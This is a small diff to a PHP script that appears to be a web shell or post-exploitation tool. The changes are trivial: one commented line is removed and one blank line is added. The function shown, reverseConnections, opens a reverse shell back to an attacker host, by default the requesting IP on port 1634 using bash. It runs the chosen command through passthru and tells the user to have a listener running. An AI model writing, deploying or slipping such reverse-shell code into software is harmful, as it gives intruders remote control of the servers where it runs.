@@ -252,7 +252,6 @@ function showEnv($os)
 function reverseConnections($methods, $host, $port, $shell)
 {
     ob_start();
-//    $errorNum = error;
     $defaultPort = 1634;
     $defaultHost = $_SERVER["REMOTE_ADDR"];
     $defaultShell = shell_exec("which bash");
@@ -291,6 +290,7 @@ function reverseConnections($methods, $host, $port, $shell)
     if (!empty($methods)) {
         echo("\nAttempting to connect back, ensure you have the listener running.\n");
         echo("\nUsing: " . $methods . "\nRhost: " . $useHost . "\nRport: " . $usePort . "\nLshell: " . $useShell . "\n");
+
         passthru($comma[$methods]) or die("Something went wrong: ->" . error_get_last() . "\r\n\r\n\r\n");
     } else {
         echo("\nYou didnt specify a method to use, defaulting to bash.\n");
